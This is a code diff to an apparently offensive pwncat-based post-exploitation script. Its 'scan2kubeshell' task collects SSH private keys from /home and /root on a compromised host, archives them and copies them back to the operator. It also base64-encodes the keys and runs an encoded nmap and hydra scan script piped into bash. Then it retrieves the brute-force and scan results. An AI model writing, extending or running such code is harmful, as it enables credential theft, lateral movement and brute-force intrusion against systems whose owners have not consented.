@@ -45,11 +45,43 @@ def execute(session: pwncat.manager.Session, task):
         session.log(result)
     elif task == "scan2kubeshell":
         result = session.platform.run(
-            'rm -f /tmp/ssh_keys.tar /tmp/ssh_keys.tar.gz 2>/dev/null; for f in $(find  /home /root -name .ssh | xargs -I {} find {} -type f); do if grep "PRIVATE" $f >/dev/null; then tar -C $(dirname $f) -rvf /tmp/ssh_keys.tar $f 2>/dev/null; fi done; gzip /tmp/ssh_keys.tar')
-        result = session.platform.run(
-            f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_connector | base64 -d | /bin/bash'",
+            'rm -f /tmp/ssh_keys.tar /tmp/ssh_keys.tar.gz 2>/dev/null; for f in $(find  /home /root -name .ssh | xargs -I {} find {} -type f); do if grep "PRIVATE" $f >/dev/null; then tar -C $(dirname $f) -rvf /tmp/ssh_keys.tar $f 2>/dev/null; fi done; gzip /tmp/ssh_keys.tar',
             cwd="/tmp", timeout=900)
         session.log(result)
+
+        session.log("copying /tmp/ssh_keys.tar.gz...")
+        with session.platform.open('/tmp/ssh_keys.tar.gz', 'rb') as f1:
+            with open(f'/tmp/{args.host}_ssh_keys.tar.gz', 'wb') as f2:
+                f2.write(f1.read())
+
+        result = session.platform.run(
+            'rm -rf /tmp/ssh_keys; mkdir /tmp/ssh_keys; tar -zxvf /tmp/ssh_keys.tar.gz -C "/tmp/ssh_keys"; cd /tmp/ssh_keys; truncate -s0 /tmp/identities.txt; for k in $(find /tmp/ssh_keys -type f); do cat $k | base64 -w0 >> /tmp/identities.txt; done',
+            cwd="/tmp", timeout=900)
+        session.log(result)
+
+        session.log("building nmap and hydra scan paylod...")
+        payload = ""
+        with open("scan.sh") as f:
+            payload = base64.b64encode(f.read())
+
+        result = session.platform.run(
+            f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_connector_scan | base64 -d | /bin/bash'",
+            cwd="/tmp", timeout=900)
+        session.log(result)
+
+        files = ["/tmp/scan.json", "/tmp/hydra-target.txt",
+                 "/tmp/hydra-targets.txt", "/tmp/hydra.txt"]
+        file_list = ", ".join(files)
+        session.log(
+            f"copying {file_list}...")
+        for f in files:
+            with session.platform.open(f, 'rb') as f1:
+                with open(f'/tmp/{args.host}_{os.path.basename(f)}', 'wb') as f2:
+                    f2.write(f1.read())
+
+        # result = session.platform.run(
+        #     f"/bin/bash -c 'echo {payload.decode()} | tee /tmp/payload_connector | base64 -d | /bin/bash'",
+        #     cwd="/tmp", timeout=900)
 
 
 with pwncat.manager.Manager() as manager:
